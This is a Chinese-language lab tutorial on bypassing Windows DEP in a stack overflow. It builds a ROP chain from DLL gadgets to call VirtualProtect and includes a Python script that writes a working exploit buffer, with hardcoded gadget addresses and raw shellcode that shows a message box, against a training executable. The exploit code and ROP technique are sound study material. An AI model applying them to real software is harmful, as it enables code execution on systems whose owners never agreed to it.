
# [原创]栈溢出漏洞利用之ShellCode绕过DEP机制

## 配置环境

打开DEP

关闭随机基质

关闭GS

## 绕过DEP原理

### 什么是DEP：即数据执行保护

应用会留出一部分电脑内存用于暂存数据，同时留出另一部分`[内存]`用于暂存应用使用的指令。 黑客可能试图诱使应用运行（也称为执行）放置在电脑内存中伪装成指令的有害数据。 这可能会让黑客得以控制你的电脑。

DEP 可以防止应用运行用于暂存指令的那部分内存中的数据，从而保护电脑。 如果 DEP 发现某个运行此类数据的应用，它将关闭该应用并通知你。

以我的理解来看，每一部分数据都有它的属性，一些数据只能用于执行代码（代码段），而不能用于修改和读取，而一些数据只能用来读取修改而不能执行（数据段）。

正因为DEP的存在，我们在漏洞利用时通过栈溢出，使得EIP被覆盖为我们指定的ShellCode初始地址并执行的方法就会变为无效。

因此，我们采用另一种方法来绕过DEP机制：

通过程序自己加载的`dll`中的一些固定指令来进行组装，达到实现调用`VirtualProtect`这个函数的功能。一旦调用成功，那么后续内存分页的属性我们自然而然也就是可以根据我们的需求进行修改了。

## 绕过DEP

那么怎么实现调用`VirtualProtect`函数呢？

这里我们需要克服一下几个难点：

1. 调用`VirtualProtect`函数所需要的参数需要按照一定顺序压入栈
2. 需要有跳转到`VirtualProtect`函数地址的指令并执行（`jmp`，`ret`,`call`都可以）
3. 执行完`VirtualProtect`函数后其返回地址应该是ShellCode数据的起始位置
4. 需要对堆栈中的地址和数据进行进行操作，因为一旦涉及到跳转（`ret`），就会改变堆栈即将数据弹出

针对以上以上几个问题：

我们就要对溢出之后的栈空间里面的数据进行精细的构造，最终才能成功运行我们的ShellCode

并且，在成功调用`VirtualProtect`函数之前，我们都不能执行我们所编写的代码，因此，我们只能通过

```
pop 寄存器
ret
```

的方式来对堆栈以及EIP进行操作，已达到调用`VirtualProtect`函数成功修改内存属性。

在这里我引入一副图来解释调用`VirtualProtect`函数后的堆栈情况：

![图片描述](upload/attach/202106/916882_4H86W37RXXNPXCX.png)

构造好`VirtualProtect`函数的堆栈后，我们要想办法去调用它，这里我们就要通过程序现有的并且地址不变的固定指令（一般可以在`kernel.dll`等通用的`dll`中寻找）进行精心组装，达到我们想要的效果。

这里大致思路如下：

一般调用函数的方法大致就是：

```
push 参数
call
```

在这里我们可以变向的转换一下思维，我们可以用`ret`对`call`进行代替，在压入参数的同时，在压入要调用的函数地址，这样在`ret`的时候，先弹出一个函数地址，剩下的就是参数，并跳转到函数地址，这样就等同于`call`了。

但是，`push`的前提：是要你的寄存器保存了你所需要的参数，在这里你就得先进行`pop`，已达到将参数放入指定的寄存器，再后续用`pushad`（这样方便）进行参数压栈，最后调用，在这里你就要用你的火眼金睛去源程序内部寻找你要的指令了：

如何寻找指令我就不多说了（`x32dbg`进行特征码寻找），直接上`python`写的小程序进行生成，但是这样设计的原理我大致解释一下：

首先，在程序产生漏洞溢出后，会跳转到覆盖后的EIP上（`pop edi; ret`）

执行（`pop edi; ret`）后，将（`ret`的地址）赋值给`edi`，并将（`pop esi ; ret`）的地址弹出并执行（注：这里的`ret`就是为了弹出没有用的参数，因为我们用的`pushad`，会压入没有必要的寄存器的值）

执行（`pop esi ; ret`）后，将`VirtualProtect`函数的地址赋值给`esi`

哎，后面就不一一解释了，一样的操作（通过`pop`进行赋值，通过`ret`进行代码执行），在`pop`赋值完之后

就要对参数进行压栈了，`pushad`压入栈的顺序如下：

`EAX->ECX->EDX->EBX->ESP->EBP->ESI->EDI`

在这里`EDI`里面保存的（`ret`的地址）就起作用了：将`EDI`弹出，然后跳转到`ESI`（`VirtualProtect`），后续跟的参数，到这里，我们就已经成功的绕过DEP了，后续的ShellCode就可以写你自己想要实现的功能了（打开计算器，弹框等）。

注：寻找的代码一定要是可以执行的！！！（看清楚了），否则你就会像作者一样，调了半个下午：

```python
if __name__ == '__main__':
file=open('C:\\Users\\password1.txt','wb')
buf=b""
buf+=b"\x41"*76 #程序溢出点
buf+=b"\xB1\x18\xB1\x77" #pop edi ret的地址（需要自己找）：被覆盖后的EIP
buf+=b"\xAD\x1F\xAC\x77" #ret的地址（需要自己找）
buf+=b"\x8D\x78\xAE\x77" #pop esi ret的地址（需要自己找）
buf+=b"\x70\x7C\x7A\x77" #VirtualProtect的地址（需要自己找）
buf+=b"\x5A\x21\xAE\x77" #pop ebp ret的地址（需要自己找）
buf+=b"\xB2\xC9\xAD\x77" #执行完VirtualProtect后的返回地址：即push esp ret的地址：等同于jmp esp（需要自己找）
buf+=b"\xF9\x8E\xAE\x77" #pop ebx ret的地址（需要自己找）
buf+=b"\x10\x00\x00\x00" #参数2：大小（需要自己找）
buf+=b"\x29\xDF\xAD\x77" #pop edx ret的地址（需要自己找）
buf+=b"\x40\x00\x00\x00" #参数3：分页属性（需要自己找）
buf+=b"\x81\xD5\xAD\x77" #pop ecx ret的地址（需要自己找）
buf+=b"\x00\xE0\x41\x00" #参数4：用于保存以前的分页属性（随便搞一个可写的地址）注：这个地址千万不要是自己编写的ShellCode的地址，原因不多说，都懂的（需要自己找）
buf+=b"\x98\xA7\x3B\x75" #pop eax ret的地址（需要自己找）
buf+=b"\x90\x90\x90\x90" #滑板指令（就是nop指令）
buf+=b"\xA1\x97\xAD\x77" #push ad ret
#ShellCode主要逻辑代码
buf+=b"\x55\x8B\xEC\x81\xEC\x2C\x01\x00\x00\x53\x33\xC0\xC7\x45\xD8\x4C\x6F\x61\x64\x56\x57"
buf+=b"\xC7\x45\xDC\x4C\x69\x62\x72\xC7\x45\xE0\x61\x72\x79\x41\x88\x45\xE4\xC7\x45\xC8\x47"
buf+=b"\x65\x74\x50\xC7\x45\xCC\x72\x6F\x63\x41\xC7\x45\xD0\x64\x64\x72\x65\x66\xC7\x45\xD4"
buf+=b"\x73\x73\x88\x45\xD6\xC7\x45\xF4\x75\x73\x65\x72\xC7\x45\xF8\x33\x32\x2E\x64\x66\xC7"
buf+=b"\x45\xFC\x6C\x6C\x88\x45\xFE\xC7\x45\xE8\x4D\x65\x73\x73\xC7\x45\xEC\x61\x67\x65\x42"
buf+=b"\xC7\x45\xF0\x6F\x78\x41\x00\x33\xC0\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x70\x1C"
buf+=b"\x8B\x06\x8B\x00\x8B\x40\x08\x89\x45\xC4\x8B\x5D\xC4\x8D\xBD\xD4\xFE\xFF\xFF\x6A\x38"
buf+=b"\x59\x8D\x73\x18\x03\x73\x3C\xF3\xA5\x8B\x85\x34\xFF\xFF\xFF\x33\xFF\x33\xF6\x8B\x4C"
buf+=b"\x18\x1C\x8B\x54\x18\x20\x03\xCB\x89\x4D\xBC\x03\xD3\x8B\x4C\x18\x24\x8B\x44\x18\x18"
buf+=b"\x03\xCB\x89\x55\xB4\x89\x4D\xC0\x89\x45\xB8\x85\xC0\x74\x2E\x8D\x45\xC8\x50\x8B\x04"
buf+=b"\xB2\x03\xC3\x50\xE8\x40\x00\x00\x00\x59\x59\x83\xF8\x01\x75\x0F\x8B\x45\xC0\x8B\x4D"
buf+=b"\xBC\x0F\xBF\x04\x70\x8B\x3C\x81\x03\xFB\x8B\x55\xB4\x46\x3B\x75\xB8\x72\xD2\x8D\x45"
buf+=b"\xD8\x50\x53\xFF\xD7\x8D\x4D\xF4\x51\xFF\xD0\x8D\x4D\xE8\x51\x50\xFF\xD7\x33\xC9\x51"
buf+=b"\x51\x51\x51\xFF\xD0\x5F\x5E\x5B\xC9\xC3\x55\x8B\xEC\x53\x8B\x5D\x0C\x33\xD2\x56\x8B"
buf+=b"\x75\x08\x57\x8B\xFA\x38\x16\x74\x11\x8B\xCB\x8B\xC6\x2B\xCE\x38\x14\x01\x74\x06\x47"
buf+=b"\x40\x38\x10\x75\xF5\x85\xFF\x7E\x30\x8B\xC6\x2B\xC3\x89\x45\x08\x8D\x0C\x1A\x8A\x04"
buf+=b"\x08\x3A\x01\x75\x1D\x80\x7C\x1A\x01\x00\x75\x07\x80\x7C\x32\x01\x00\x74\x0A\x42\x3B"
buf+=b"\xD7\x7D\x0C\x8B\x45\x08\xEB\xDE\x33\xC0\x40\xEB\x02\x33\xC0\x5F\x5E\x5B\x5D\xC3"
file.write(buf)
file.close()
```

注：在这里我没有对`ESP`寄存器的值进行操作，这是因为`ESP`的并不会随着`pop`得指令进行改变，只会随着指令的执行而更改。因此在这里，`VirtualProtect`的第一个参数，分页地址，直接就采用当前`ESP`的值。

来个演示截图：

![图片描述](upload/attach/202106/916882_JY8SEQG4EJHP4PC.png)

最后：当然也不一定非要按照`pushad`的顺序对寄存器进行操作，如果逻辑能力强的话，正好你也感兴趣的话，可以试着寻找比如直接一连`pop`好几个寄存器的地方进行组装，最后也能达到想要的效果。

后续附上存在溢出漏洞的`exe`（注：该`exe`是通过读取同一目录下`password.txt`进行判定密码是否正确）[使用来源于15pb]
